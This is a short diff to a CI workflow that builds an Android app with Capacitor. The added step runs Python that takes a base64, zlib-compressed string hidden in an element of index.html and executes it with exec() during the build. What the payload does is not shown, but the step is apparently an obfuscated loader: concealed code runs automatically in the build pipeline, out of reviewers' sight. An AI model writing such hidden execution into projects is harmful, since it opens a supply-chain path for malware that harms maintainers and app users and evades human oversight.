@@ -19,6 +19,13 @@ jobs:
       - run: npx cap add android
       - run: npx cap sync android
       - run: sed -i 's#</manifest>#    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />\n</manifest>#' android/app/src/main/AndroidManifest.xml
+      - run: |
+          python3 - <<'PY'
+          import re,base64,zlib
+          h=open('index.html',encoding='utf-8').read()
+          b=re.search(r'id="cv-native-patch">([^<]*)<',h).group(1)
+          exec(zlib.decompress(base64.b64decode(b)).decode())
+          PY
       - run: cd android && chmod +x gradlew && ./gradlew assembleDebug
       - uses: actions/upload-artifact@v4
         with:
